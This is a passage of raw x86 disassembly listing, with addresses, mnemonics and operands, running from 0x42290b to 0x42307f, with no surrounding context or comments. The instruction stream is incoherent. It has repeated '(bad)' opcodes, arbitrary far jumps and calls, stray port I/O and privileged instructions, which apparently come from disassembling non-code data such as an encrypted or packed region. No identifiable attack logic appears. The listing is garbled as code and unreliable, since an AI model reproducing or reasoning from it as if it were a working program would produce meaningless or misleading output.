  42290b:	sbb    DWORD PTR [esi],0x54
  42290e:	cdq    
  42290f:	xor    eax,0x5266c4a6
  422914:	jle    0x42293b
  422916:	mov    esp,0x786fd921
  42291b:	enter  0xd938,0x63
  42291f:	ins    BYTE PTR es:[edi],dx
  422920:	inc    eax
  422921:	jne    0x42293d
  422923:	outs   dx,DWORD PTR ds:[esi]
  422924:	fiadd  WORD PTR [ecx+0x748d9b55]
  42292a:	add    BYTE PTR [ecx],bh
  42292c:	jbe    0x4229a2
  42292e:	aas    
  42292f:	lods   eax,DWORD PTR ds:[esi]
  422930:	outs   dx,DWORD PTR ds:[esi]
  422931:	fist   DWORD PTR [esi-0xbdd3d60]
  422937:	gs inc esi
  422939:	push   es
  42293a:	pusha  
  42293b:	fs je  0x422994
  42293e:	sub    ebx,ecx
  422940:	shr    DWORD PTR [eax],0x5e
  422943:	add    al,0x6f
  422945:	repnz inc ebp
  422947:	xchg   edi,eax
  422948:	adc    DWORD PTR [ecx-0x2c7e20d1],edx
  42294e:	inc    edi
  42294f:	or     DWORD PTR [ebx-0x75],esi
  422952:	loop   0x4229ad
  422954:	fisttp QWORD PTR [ebx]
  422956:	jmp    0x8de9fbbc
  42295b:	cs jne 0x42298c
  42295e:	mov    ds:0xe4f37fc4,al
  422963:	test   DWORD PTR [ecx+esi*2-0x2f],edi
  422967:	ss popf 
  422969:	stos   BYTE PTR es:[edi],al
  42296a:	(bad)  
  42296b:	loop   0x4228f4
  42296d:	das    
  42296e:	mov    BYTE PTR [ebx-0x40],0xb1
  422972:	lahf   
  422973:	les    edi,FWORD PTR [eax+eax*8-0x4d]
  422977:	pop    esi
  422978:	push   edx
  422979:	push   eax
  42297a:	mov    dh,0x7e
  42297c:	aam    0x1d
  42297e:	fcomp  QWORD PTR [eax]
  422980:	push   edx
  422981:	xor    eax,0xdf77d8f5
  422986:	mov    ds:0xa1e0fbd3,al
  42298b:	adc    DWORD PTR [eax-0x346e41ee],esi
  422991:	sbb    al,0x90
  422993:	mov    eax,ds:0xed8ff215
  422998:	pop    ss
  422999:	adc    esp,DWORD PTR [ebp+0x5c]
  42299c:	test   al,0xc6
  42299e:	or     ch,BYTE PTR [eax+esi*2+0x396da7f8]
  4229a5:	call   0x4cda:0x86c700a9
  4229ac:	xchg   bh,cl
  4229ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4229af:	test   BYTE PTR [ebp+edx*1+0x15],0xb8
  4229b4:	popf   
  4229b5:	and    edi,DWORD PTR [eax]
  4229b7:	push   edi
  4229b8:	pop    esp
  4229b9:	xchg   edi,eax
  4229ba:	popf   
  4229bb:	or     BYTE PTR [esi],al
  4229bd:	jecxz  0x42295e
  4229bf:	mov    ebx,0x3066e889
  4229c4:	scas   eax,DWORD PTR es:[edi]
  4229c5:	ss pusha 
  4229c7:	das    
  4229c8:	(bad)  
  4229cb:	sbb    al,BYTE PTR ds:0xc44bb5fc
  4229d1:	arpl   WORD PTR [ecx+ebx*8+0x43],bp
  4229d5:	nop
  4229d6:	test   DWORD PTR [ecx-0x70f02367],esi
  4229dc:	fwait
  4229dd:	jo     0x422a2e
  4229df:	pusha  
  4229e0:	sahf   
  4229e1:	jbe    0x4229a9
  4229e3:	push   esi
  4229e4:	and    al,0x43
  4229e7:	imul   BYTE PTR [ecx]
  4229e9:	and    ch,cl
  4229eb:	push   cs
  4229ec:	sahf   
  4229ed:	pop    eax
  4229ee:	xchg   esp,eax
  4229ef:	mov    bh,0x64
  4229f1:	push   ss
  4229f2:	and    DWORD PTR [edx],0x1f16b399
  4229f8:	fnstenv [ecx+0x43]
  4229fb:	call   0xfa814baa
  422a00:	fucom  st(3)
  422a02:	inc    edx
  422a03:	sub    al,BYTE PTR [eax+0x30]
  422a06:	aam    0xa5
  422a08:	xchg   edi,eax
  422a09:	in     al,dx
  422a0a:	jmp    DWORD PTR [ebx-0x512920e2]
  422a10:	cmp    BYTE PTR [eax],0x9e
  422a13:	inc    ebx
  422a14:	stos   BYTE PTR es:[edi],al
  422a15:	pop    ds
  422a16:	jge    0x422a69
  422a18:	push   ebp
  422a19:	jl     0x422a7b
  422a1b:	in     eax,dx
  422a1c:	mov    ds:0x17dd8c32,eax
  422a21:	repnz xor ebx,ebx
  422a24:	mov    dl,0xb6
  422a26:	mov    dh,BYTE PTR [edx+0x17]
  422a29:	mov    edx,ebx
  422a2b:	inc    ebp
  422a2c:	es xchg ebx,eax
  422a2e:	pop    ss
  422a2f:	sbb    eax,0x93518f24
  422a34:	dec    ecx
  422a35:	lea    esp,[esi-0x81abb05]
  422a3b:	mov    fs,WORD PTR [edx-0x5aed24cc]
  422a41:	stos   DWORD PTR es:[edi],eax
  422a42:	jg     0x422ac0
  422a44:	adc    bh,BYTE PTR [esi+0x6b771e9e]
  422a4a:	ins    DWORD PTR es:[edi],dx
  422a4b:	not    esp
  422a4d:	lods   eax,DWORD PTR ds:[esi]
  422a4e:	jmp    0xf65f:0xb9be81d
  422a55:	popa   
  422a56:	adc    ebp,0x2fc1cfb1
  422a5c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422a5d:	jo     0x4229e1
  422a5f:	xchg   ebx,eax
  422a60:	mov    BYTE PTR [esi+0x29],cl
  422a63:	fadd   DWORD PTR [ebx-0x4e]
  422a66:	mov    es,WORD PTR [ebx+0x398ccc8b]
  422a6c:	inc    ebx
  422a6d:	dec    ebp
  422a6e:	aaa    
  422a6f:	or     al,0x64
  422a71:	ds mov ecx,0x27f05b2b
  422a77:	idiv   DWORD PTR [ebx-0x4f]
  422a7a:	stos   DWORD PTR es:[edi],eax
  422a7b:	dec    ecx
  422a7c:	and    ecx,esi
  422a7e:	or     eax,0xf90abac8
  422a83:	mov    cl,0xdc
  422a85:	push   ebx
  422a86:	(bad)  
  422a87:	aam    0xd5
  422a89:	or     ah,BYTE PTR [ebp+0x19]
  422a8c:	mov    ds:0x8c2561ee,al
  422a91:	jne    0x422ace
  422a93:	jl     0x422a76
  422a95:	mov    ds:0x6417c86b,al
  422a9a:	pop    ecx
  422a9b:	jns    0x422a1f
  422a9d:	test   DWORD PTR [edi-0x468c7b03],ebp
  422aa3:	inc    ebx
  422aa4:	mov    ecx,0xf80e6abb
  422aa9:	je     0x422a79
  422aab:	stos   DWORD PTR es:[edi],eax
  422aac:	lods   eax,DWORD PTR ds:[esi]
  422aad:	aam    0x7b
  422aaf:	adc    eax,0xacdaf84b
  422ab4:	push   edx
  422ab5:	mov    DWORD PTR [ecx],edi
  422ab7:	xchg   edi,eax
  422ab8:	or     BYTE PTR [esi-0x4f],dh
  422abb:	inc    esi
  422abc:	inc    eax
  422abd:	add    al,0x1e
  422abf:	out    dx,eax
  422ac0:	clc    
  422ac1:	or     bh,BYTE PTR [esp+ecx*2]
  422ac4:	mov    WORD PTR [edi-0x64],gs
  422ac7:	not    DWORD PTR [edi+esi*8+0x25]
  422acb:	sub    bl,dh
  422acd:	push   ds
  422ace:	cmp    BYTE PTR [ebx+0x34],0x7b
  422ad2:	outs   dx,BYTE PTR ds:[esi]
  422ad3:	mov    ebp,0x514e9622
  422ad8:	es in  al,dx
  422ada:	inc    ebx
  422adb:	jl     0x422b27
  422add:	cdq    
  422ade:	push   0xffffff8c
  422ae0:	scas   eax,DWORD PTR es:[edi]
  422ae1:	ja     0x422a7e
  422ae3:	jns    0x422af6
  422ae5:	mov    ecx,0x9d73728f
  422aea:	bound  edi,QWORD PTR [eax-0x3c]
  422aed:	retf   
  422aee:	push   ebp
  422aef:	test   DWORD PTR [edi],ebx
  422af1:	xor    ebp,DWORD PTR [esi]
  422af3:	dec    ebp
  422af4:	cld    
  422af5:	pop    ds
  422af6:	or     BYTE PTR [eax],bl
  422af8:	mov    esp,0x348be33c
  422afd:	cmp    edi,DWORD PTR [edx+0x16]
  422b00:	or     BYTE PTR [ecx-0x7594ec14],dl
  422b06:	xchg   edi,eax
  422b07:	xchg   esi,eax
  422b08:	adc    eax,0x5f82cd81
  422b0d:	add    BYTE PTR [ecx-0x43],al
  422b10:	(bad)  
  422b11:	xchg   edx,eax
  422b12:	test   BYTE PTR [ebp-0x7700b777],al
  422b18:	cmp    BYTE PTR [edx+0x67],bh
  422b1b:	add    al,0xab
  422b1d:	xor    al,0x5d
  422b1f:	dec    eax
  422b20:	rcl    BYTE PTR [eax],1
  422b22:	je     0x422aa6
  422b24:	xchg   esp,eax
  422b25:	inc    DWORD PTR [edx+0x562657c3]
  422b2b:	pop    esi
  422b2c:	sub    DWORD PTR [eax+0x48],0x44
  422b30:	enter  0x1124,0x80
  422b34:	add    ecx,DWORD PTR [ebp+0x6596652c]
  422b3a:	rol    BYTE PTR [edx],0x2b
  422b3d:	adc    eax,0xea7c656d
  422b42:	fimul  WORD PTR [ecx-0x28c56759]
  422b48:	xchg   esp,eax
  422b49:	mov    ebp,0x8355e04
  422b4e:	clc    
  422b4f:	jbe    0x422b5a
  422b51:	jns    0x422b8c
  422b53:	in     al,dx
  422b54:	aam    0x5e
  422b56:	jecxz  0x422b69
  422b58:	ja     0x422b04
  422b5a:	out    dx,eax
  422b5b:	jb     0x422b35
  422b5d:	ror    BYTE PTR [esi-0x3b],cl
  422b60:	int    0xa1
  422b62:	sar    edx,1
  422b64:	(bad)  
  422b65:	sbb    eax,0xc9054d4e
  422b6a:	mov    ecx,0xe8601a8b
  422b6f:	hlt    
  422b70:	inc    edx
  422b71:	push   eax
  422b72:	rcr    BYTE PTR [ebx-0x595f9c89],cl
  422b78:	sub    BYTE PTR [ebp-0x468b09c2],ch
  422b7e:	jmp    0x422bdb
  422b80:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422b81:	push   ss
  422b82:	xchg   BYTE PTR [ebx+0x6be22cc8],bl
  422b88:	push   edi
  422b89:	push   ecx
  422b8a:	dec    edi
  422b8b:	xchg   ebx,eax
  422b8c:	ins    BYTE PTR es:[edi],dx
  422b8d:	mov    bh,0xbb
  422b8f:	out    dx,eax
  422b90:	push   ebx
  422b91:	pop    eax
  422b92:	dec    ebx
  422b93:	in     eax,0xd6
  422b95:	shl    DWORD PTR [ebp-0x5f],0x4f
  422b99:	repnz xor DWORD PTR [ebx-0x6],ecx
  422b9d:	jl     0x422bae
  422b9f:	ds jnp 0x422c0e
  422ba2:	sbb    bl,BYTE PTR [edx]
  422ba4:	sbb    DWORD PTR [eax+0x144ef7ed],0x9a9ec482
  422bae:	jbe    0x422bd3
  422bb0:	add    ch,bl
  422bb2:	scas   al,BYTE PTR es:[edi]
  422bb3:	cmp    DWORD PTR [edi-0x38],edx
  422bb6:	cmp    eax,0xc4ef1235
  422bbb:	or     ebx,esp
  422bbd:	sbb    eax,0xcae52fcd
  422bc2:	arpl   di,bp
  422bc4:	popa   
  422bc5:	and    DWORD PTR [ebp-0x7e],esi
  422bc8:	adc    ebx,DWORD PTR [esi+0x7c82fcef]
  422bce:	arpl   WORD PTR [eax-0x77c20d10],di
  422bd4:	or     al,0xde
  422bd6:	mov    BYTE PTR [ebp+esi*8+0x3b2c68fb],dl
  422bdd:	mov    bl,0xa0
  422bdf:	and    eax,0xb5e7f284
  422be4:	mov    edi,0x8c4ebfc
  422be9:	fcmovu st,st(7)
  422beb:	ret    0x44ec
  422bee:	ja     0x422bc5
  422bf0:	push   esi
  422bf1:	(bad)  
  422bf2:	out    dx,eax
  422bf3:	into   
  422bf4:	pop    edi
  422bf5:	pop    ecx
  422bf6:	scas   al,BYTE PTR es:[edi]
  422bf7:	push   esi
  422bf8:	imul   eax,DWORD PTR [edi+0xd],0xffffff93
  422bfc:	xchg   ebp,eax
  422bfd:	dec    edx
  422bfe:	mov    eax,0x471577fe
  422c03:	pop    esp
  422c04:	mov    DWORD PTR [edx],0x3b1f351f
  422c0a:	jle    0x422c2f
  422c0c:	inc    edx
  422c0d:	inc    eax
  422c0e:	out    0x89,al
  422c10:	iret   
  422c11:	scas   eax,DWORD PTR es:[edi]
  422c12:	or     eax,0xfdae0afb
  422c17:	xchg   edi,eax
  422c18:	cbw    
  422c1a:	xchg   edi,eax
  422c1b:	inc    ebx
  422c1c:	retf   0x14c6
  422c1f:	sbb    al,cl
  422c21:	ins    DWORD PTR es:[edi],dx
  422c22:	faddp  st(3),st
  422c24:	aas    
  422c25:	rcl    DWORD PTR [esi+ebp*2],0x90
  422c29:	mov    esp,DWORD PTR [ecx+0x1c995744]
  422c2f:	fidiv  WORD PTR [eax]
  422c31:	ror    DWORD PTR [eax],1
  422c33:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422c34:	sbb    ebp,DWORD PTR [edx+0x4d67e9c0]
  422c3a:	(bad)  
  422c3b:	sbb    eax,DWORD PTR [eax-0x60]
  422c3e:	fwait
  422c3f:	jbe    0x422c63
  422c41:	in     eax,dx
  422c42:	pushf  
  422c43:	outs   dx,DWORD PTR ds:[esi]
  422c44:	scas   al,BYTE PTR es:[edi]
  422c45:	lahf   
  422c46:	out    dx,eax
  422c47:	test   DWORD PTR [ebp-0x2a47511],ebp
  422c4d:	xor    BYTE PTR [ebp+eiz*2-0x56],al
  422c51:	dec    edi
  422c52:	sahf   
  422c53:	fstp   QWORD PTR [ecx+0xcd44e6c]
  422c59:	xor    BYTE PTR [edx-0x2f3ffcec],0x4f
  422c60:	aaa    
  422c61:	lahf   
  422c62:	push   0x97cf959f
  422c67:	add    BYTE PTR [edi],cl
  422c69:	mov    bl,0x40
  422c6b:	clc    
  422c6c:	jo     0x422c02
  422c6e:	mov    ch,0x11
  422c70:	daa    
  422c71:	xor    dx,cx
  422c74:	xchg   esi,eax
  422c75:	outs   dx,DWORD PTR ds:[esi]
  422c76:	mov    edx,0x37bdf1f1
  422c7b:	mov    gs,WORD PTR [esi-0x209371c4]
  422c81:	psrlq  mm1,QWORD PTR [edi-0x5ec0b413]
  422c88:	dec    esi
  422c89:	addr16 jle 0x422c66
  422c8c:	pop    ss
  422c8d:	mov    ds:0x5b25ca16,al
  422c92:	das    
  422c93:	into   
  422c94:	adc    eax,esp
  422c96:	std    
  422c97:	mov    ss,WORD PTR [ebp-0x56]
  422c9a:	push   ss
  422c9b:	inc    ebx
  422c9c:	mov    dl,0xa1
  422c9e:	mov    ebx,0x60726d4f
  422ca3:	mov    esi,0xd8b7a185
  422ca8:	loope  0x422c63
  422caa:	mov    esi,0xa8d26d14
  422caf:	cmp    al,0x63
  422cb1:	imul   esp,DWORD PTR [ecx-0x23],0xffffffb3
  422cb5:	push   es
  422cb6:	jne    0x422c75
  422cb8:	stc    
  422cb9:	retf   0x4e93
  422cbc:	cmp    al,bh
  422cbe:	sub    eax,0x63d257e0
  422cc3:	ss cli 
  422cc5:	loop   0x422c93
  422cc7:	aam    0x58
  422cc9:	cli    
  422cca:	imul   edi,ebp,0x6d
  422ccd:	jne    0x422d31
  422ccf:	mov    WORD PTR [esi],ds
  422cd1:	icebp  
  422cd2:	aam    0x3
  422cd4:	call   0x1c0b4769
  422cd9:	and    eax,0xea1473de
  422cde:	fsubr  st(2),st
  422ce0:	cli    
  422ce1:	pop    es
  422ce2:	gs fadd st,st(7)
  422ce5:	fsubr  DWORD PTR [ebp+0x5f4abae]
  422ceb:	xchg   esp,eax
  422cec:	(bad)  
  422ced:	inc    esp
  422cee:	dec    ecx
  422cef:	pop    ebp
  422cf0:	push   ecx
  422cf1:	fisub  DWORD PTR [edx-0x44]
  422cf4:	outs   dx,DWORD PTR ds:[esi]
  422cf5:	sub    eax,0x49f0b839
  422cfa:	pop    esi
  422cfb:	(bad)  
  422cfd:	cli    
  422cfe:	cmp    ebp,ebp
  422d00:	fild   QWORD PTR [edi-0x1fbdf28]
  422d06:	out    dx,al
  422d07:	xchg   ebp,eax
  422d08:	push   ss
  422d09:	pop    esi
  422d0a:	out    0x67,eax
  422d0c:	fsubr  st(6),st
  422d0e:	push   edx
  422d0f:	mov    bl,0x10
  422d11:	hlt    
  422d12:	push   edi
  422d13:	jno    0x422ccb
  422d15:	stos   DWORD PTR es:[edi],eax
  422d16:	loop   0x422d5e
  422d18:	push   es
  422d19:	scas   al,BYTE PTR es:[edi]
  422d1a:	and    eax,0x2f747cdb
  422d1f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d20:	jg     0x422d39
  422d22:	xchg   edx,eax
  422d23:	imul   BYTE PTR [eax-0x1e602793]
  422d29:	sahf   
  422d2a:	or     eax,0x33f84461
  422d2f:	lods   eax,DWORD PTR ds:[esi]
  422d30:	pusha  
  422d31:	mov    dl,dh
  422d33:	mov    ds:0x1e96a04c,eax
  422d38:	lds    edi,FWORD PTR [ecx-0x18584a33]
  422d3e:	jne    0x422d93
  422d40:	jae    0x422d28
  422d42:	cdq    
  422d43:	xchg   edi,eax
  422d44:	leave  
  422d45:	cmp    BYTE PTR [ebp-0x6],0xc5
  422d49:	push   ebp
  422d4a:	out    0x35,al
  422d4c:	push   edx
  422d4e:	mov    edx,0x700ebf96
  422d53:	jnp    0x422d08
  422d55:	sbb    eax,0xbfef6956
  422d5a:	loopne 0x422d3c
  422d5c:	mov    edx,ss
  422d5e:	or     DWORD PTR [edx+0x7c],0x760a8f8d
  422d65:	inc    esi
  422d66:	adc    dl,ch
  422d68:	adc    bl,BYTE PTR [eax]
  422d6a:	dec    ecx
  422d6b:	sub    eax,0xb5da8073
  422d70:	push   0xf15f4e84
  422d75:	mov    DWORD PTR [ebx],edx
  422d77:	stos   DWORD PTR es:[edi],eax
  422d78:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422d79:	dec    ebx
  422d7a:	xchg   edi,eax
  422d7b:	lea    edx,[eax-0x6e4d982d]
  422d81:	mov    dl,0xc4
  422d83:	xchg   esi,eax
  422d84:	inc    eax
  422d85:	repnz xor edi,ebx
  422d88:	mul    BYTE PTR [ebp+0x2]
  422d8b:	test   al,0x9a
  422d8d:	test   eax,0x72657823
  422d92:	js     0x422e12
  422d94:	xchg   ebx,eax
  422d95:	fcom   DWORD PTR [ecx+0x5e]
  422d98:	push   ebx
  422d99:	mov    ds:0xaa5a8973,eax
  422d9e:	leave  
  422d9f:	mov    al,0x16
  422da1:	and    ebx,DWORD PTR [ebx]
  422da3:	inc    ebx
  422da4:	mov    bh,0x56
  422da6:	xor    DWORD PTR es:[edx],eax
  422da9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422daa:	in     al,0x7f
  422dac:	jne    0x422d6a
  422dae:	jp     0x422dcd
  422db0:	scas   al,BYTE PTR es:[edi]
  422db1:	fadd   DWORD PTR [esi-0x31]
  422db4:	das    
  422db5:	cmp    dl,BYTE PTR [eax]
  422db7:	and    eax,0x9aa43723
  422dbc:	cmp    DWORD PTR [eax+edi*8],edi
  422dbf:	adc    BYTE PTR [ecx],dl
  422dc1:	push   edx
  422dc2:	jns    0x422e3a
  422dc4:	sub    al,0x7c
  422dc6:	and    BYTE PTR [esp+eax*4+0x4f85985],bl
  422dcd:	outs   dx,BYTE PTR ds:[esi]
  422dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422dcf:	popa   
  422dd0:	jmp    0x422d6f
  422dd2:	add    edi,ebx
  422dd4:	gs pop ss
  422dd6:	inc    ebp
  422dd7:	mov    esp,DWORD PTR [edi]
  422dd9:	sub    esi,DWORD PTR cs:[ecx]
  422ddc:	xor    BYTE PTR [ecx+ebx*2],dh
  422ddf:	inc    edi
  422de0:	imul   esi,DWORD PTR [edi+0x3a],0x1cbafb0a
  422de7:	lea    ebx,[ecx+0x31575462]
  422ded:	(bad)  
  422dee:	xlat   BYTE PTR ds:[ebx]
  422def:	mov    cs,edx
  422df1:	(bad)  
  422df2:	lods   eax,DWORD PTR ds:[esi]
  422df3:	(bad)  
  422df5:	(bad)  
  422df6:	sub    esp,edx
  422df8:	jbe    0x422e75
  422dfa:	out    0xd7,eax
  422dfc:	(bad)  
  422dfd:	push   eax
  422dfe:	sbb    dh,dl
  422e00:	pushf  
  422e01:	mov    ds:0x412ca45a,al
  422e06:	es iret 
  422e08:	dec    edi
  422e09:	cmp    BYTE PTR [ebx],dl
  422e0b:	aaa    
  422e0c:	and    al,0x31
  422e0e:	add    bl,BYTE PTR [ecx]
  422e10:	and    eax,0x275e9e8c
  422e15:	jne    0x422dea
  422e17:	adc    al,0xcb
  422e19:	(bad)  
  422e1a:	in     eax,dx
  422e1b:	inc    eax
  422e1c:	jno    0x422e49
  422e1e:	imul   ecx,DWORD PTR [edi+0x20],0xffffffce
  422e22:	cmp    esp,edx
  422e24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422e25:	jmp    0x422e84
  422e27:	adc    eax,0xa1508ebc
  422e2c:	repnz cmp al,0x48
  422e2f:	rcr    DWORD PTR [esi],cl
  422e31:	div    DWORD PTR [ecx+edi*4]
  422e34:	inc    esi
  422e35:	add    eax,0xbdacde80
  422e3a:	mov    edx,0x8a730095
  422e3f:	lahf   
  422e40:	mov    eax,0x746f6362
  422e45:	mov    edi,DWORD PTR [esi+0x3a2cdae7]
  422e4b:	in     al,0x94
  422e4d:	sahf   
  422e4e:	jmp    0xa28e:0xa0fe5c06
  422e55:	shr    DWORD PTR [eax+0x30],1
  422e58:	push   ebx
  422e59:	int3   
  422e5a:	sbb    BYTE PTR ds:0x7f4902b,al
  422e60:	aam    0x99
  422e62:	enter  0xa3d6,0x60
  422e66:	addr16 or eax,0xd310c994
  422e6c:	pushf  
  422e6d:	push   esi
  422e6e:	fsubr  DWORD PTR [edx]
  422e70:	push   ss
  422e71:	push   edi
  422e72:	shl    dh,0x6
  422e75:	push   cs
  422e76:	cmc    
  422e77:	mov    al,ds:0x7b18c015
  422e7c:	leave  
  422e7d:	xchg   esi,eax
  422e7e:	mov    ds,WORD PTR ds:0x137f0d1a
  422e84:	dec    esi
  422e85:	push   0xffffffa0
  422e87:	dec    ebp
  422e88:	adc    al,0xc9
  422e8a:	test   al,0xde
  422e8c:	mov    esi,0x23ba2a6a
  422e91:	and    edi,DWORD PTR [edx]
  422e93:	cld    
  422e94:	jge    0x422f0e
  422e96:	sbb    DWORD PTR [ebp+0x56f3d24d],edx
  422e9c:	sbb    eax,0xad7adaad
  422ea1:	mov    esp,esi
  422ea3:	cmp    BYTE PTR [eax],ah
  422ea5:	jg     0x422eea
  422ea7:	test   eax,esi
  422ea9:	push   ebp
  422eaa:	xor    eax,0x6d38b8f2
  422eaf:	cmp    ecx,ebx
  422eb1:	jo     0x422f00
  422eb3:	int3   
  422eb4:	aas    
  422eb5:	inc    ecx
  422eb6:	jmp    0x94e7:0x77c7ba0
  422ebd:	ins    DWORD PTR es:[edi],dx
  422ebe:	mov    bl,cl
  422ec0:	inc    edi
  422ec1:	jbe    0x422ed5
  422ec3:	push   edi
  422ec4:	scas   al,BYTE PTR es:[edi]
  422ec5:	fs daa 
  422ec7:	es xchg bl,dl
  422eca:	fdiv   QWORD PTR [ecx+edi*4]
  422ecd:	iret   
  422ece:	std    
  422ecf:	mov    esi,edi
  422ed1:	mov    ah,0xd
  422ed3:	dec    esp
  422ed4:	add    BYTE PTR [esi],0xca
  422ed7:	loopne 0x422e77
  422ed9:	popa   
  422eda:	adc    dl,BYTE PTR [eax]
  422edc:	xor    DWORD PTR [ecx],ecx
  422ede:	jl     0x422f10
  422ee0:	into   
  422ee1:	lods   al,BYTE PTR ds:[esi]
  422ee2:	loope  0x422f5f
  422ee4:	xor    ch,BYTE PTR [ecx-0x541efb15]
  422eea:	shl    DWORD PTR [ebx],cl
  422eec:	or     eax,DWORD PTR [eax+ebx*8-0x4fb06055]
  422ef3:	adc    dh,BYTE PTR [esi+ebx*4+0x76070c65]
  422efa:	cmp    bh,cl
  422efc:	jmp    0x422f59
  422efe:	es mov eax,0x92b30a79
  422f04:	xchg   ebx,eax
  422f05:	shr    DWORD PTR [edi+0x2a],0x78
  422f09:	xchg   esp,eax
  422f0a:	pop    esi
  422f0b:	fild   WORD PTR [ebx]
  422f0d:	hlt    
  422f0e:	mov    BYTE PTR [ecx],dh
  422f10:	xor    al,0xc0
  422f12:	int3   
  422f13:	(bad)  
  422f14:	inc    eax
  422f15:	pop    ss
  422f16:	inc    edx
  422f17:	cdq    
  422f18:	nop
  422f19:	mov    bh,al
  422f1b:	mov    edi,0x3e1ee1a1
  422f20:	call   0x5cd6a1bf
  422f25:	xchg   ebp,eax
  422f26:	mov    WORD PTR [ecx+0x2f],cs
  422f29:	xor    al,0xbd
  422f2b:	sbb    eax,0x714c09aa
  422f30:	push   esi
  422f31:	xor    BYTE PTR [ebx],bh
  422f33:	xchg   edx,eax
  422f34:	dec    edx
  422f35:	cs imul ebp,edx,0x4a
  422f39:	fistp  QWORD PTR [edi+0x31]
  422f3c:	ss cmp al,0x9b
  422f3f:	xor    esp,DWORD PTR [edx+0x25]
  422f42:	sbb    BYTE PTR [edi+0x2517dfd6],cl
  422f48:	lods   eax,DWORD PTR ds:[esi]
  422f49:	imul   edi
  422f4b:	jge    0x422f71
  422f4d:	jmp    0x124d:0xdd36a96
  422f54:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422f55:	mov    dh,BYTE PTR [eax]
  422f57:	sub    cl,dh
  422f59:	imul   ecx,ebx,0xffffff9e
  422f5c:	sbb    al,0xaf
  422f5e:	cdq    
  422f5f:	outs   dx,DWORD PTR ds:[esi]
  422f60:	test   al,0x58
  422f62:	mov    DWORD PTR [ebp+0x7b],0x4a114ead
  422f69:	mov    dl,BYTE PTR [esi+0x9d50373]
  422f6f:	lods   al,BYTE PTR ds:[esi]
  422f70:	add    ebp,edx
  422f72:	lahf   
  422f73:	cmp    DWORD PTR [edx-0x43],esi
  422f76:	mov    cl,0xae
  422f78:	(bad)  
  422f79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422f7a:	or     BYTE PTR [eax-0x44],dl
  422f7d:	adc    al,0x1a
  422f7f:	call   0xd1846539
  422f84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422f85:	das    
  422f86:	jbe    0x422f41
  422f88:	(bad)  
  422f8a:	aam    0x96
  422f8c:	mov    dh,0x2b
  422f8e:	neg    BYTE PTR [eax+0x50]
  422f91:	scas   al,BYTE PTR es:[edi]
  422f92:	and    bh,BYTE PTR [esi+edi*8-0x7c745c51]
  422f99:	fcmovne st,st(5)
  422f9b:	or     eax,0x77e2427d
  422fa0:	pop    edi
  422fa1:	adc    ch,BYTE PTR [eax+0x492c2478]
  422fa7:	iret   
  422fa8:	dec    esi
  422fa9:	test   eax,0x1d0d46b9
  422fae:	jecxz  0x42302c
  422fb0:	cld    
  422fb1:	dec    edi
  422fb2:	in     al,0x6d
  422fb4:	dec    eax
  422fb5:	mov    DWORD PTR [ebp-0x7e],edx
  422fb8:	repz mov WORD PTR [esi],es
  422fbb:	lods   eax,DWORD PTR ds:[esi]
  422fbc:	std    
  422fbd:	or     al,0x16
  422fbf:	pushw  0xffb7
  422fc2:	push   edx
  422fc3:	fstp   st(3)
  422fc5:	ret    0xba75
  422fc8:	add    edx,DWORD PTR ds:0xd2ab56bf
  422fce:	sbb    ch,ch
  422fd0:	jns    0x422fd4
  422fd2:	pop    edx
  422fd3:	add    al,0x89
  422fd5:	push   esp
  422fd6:	ins    DWORD PTR es:[edi],dx
  422fd7:	mov    ebx,?
  422fd9:	mov    dh,0x49
  422fdb:	cmp    dh,ah
  422fdd:	mov    cl,0xa0
  422fdf:	fisubr WORD PTR [edx]
  422fe1:	jns    0x422f76
  422fe3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422fe4:	or     bh,cl
  422fe6:	(bad)  
  422fe7:	(bad)  
  422fe8:	mov    ch,0xb
  422fea:	nop
  422feb:	sbb    esp,0x85ed9b22
  422ff1:	nop
  422ff2:	cmp    al,0x35
  422ff4:	pop    edi
  422ff5:	sbb    al,0xf8
  422ff7:	fld    DWORD PTR [edi+0x70]
  422ffa:	ds pop ebp
  422ffc:	test   eax,0x511c235
  423001:	jne    0x42307e
  423003:	jb     0x42303e
  423005:	or     ebp,DWORD PTR [ebx]
  423007:	repnz adc DWORD PTR [ebx+0x3bcb334e],esi
  42300e:	popa   
  42300f:	int    0x42
  423011:	cmp    ch,BYTE PTR [edx]
  423013:	dec    esi
  423014:	or     eax,0x71a2c07c
  423019:	adc    al,0x69
  42301b:	xchg   edi,eax
  42301c:	outs   dx,DWORD PTR ds:[esi]
  42301d:	nop
  42301e:	es mov dh,0x4e
  423021:	and    ch,BYTE PTR [edi-0xb40d202]
  423027:	mov    esi,0xf712d54f
  42302c:	mov    ebx,0x85366a93
  423031:	add    DWORD PTR [edx],ebp
  423033:	xor    eax,0x7bdaeff
  423038:	jmp    0x75b05fa7
  42303d:	or     bh,dl
  42303f:	out    0xd8,eax
  423041:	loopne 0x4230bf
  423043:	lods   eax,DWORD PTR ds:[esi]
  423044:	sbb    BYTE PTR [ecx+0x36],bl
  423047:	in     al,0x8
  423049:	lahf   
  42304a:	test   DWORD PTR [ecx-0x3652d3b5],edi
  423050:	ins    DWORD PTR es:[edi],dx
  423051:	adc    cl,dl
  423053:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  423054:	sub    ebx,DWORD PTR [esi+edx*2+0x2a]
  423058:	sbb    eax,0xaeafc5e4
  42305d:	add    esi,DWORD PTR [ebx+eax*8]
  423060:	iret   
  423061:	mov    edx,0x3847ff05
  423066:	add    BYTE PTR [ecx],cl
  423068:	sbb    eax,0x9b6189f4
  42306d:	mov    ebp,0xdc67153
  423072:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423073:	ret    
  423074:	pop    ecx
  423075:	(bad)  
  423076:	and    eax,0xe953d41e
  42307b:	jae    0x4230e2
  42307d:	pop    edx
  42307e:	dec    edx
  42307f:	in     al,0x33
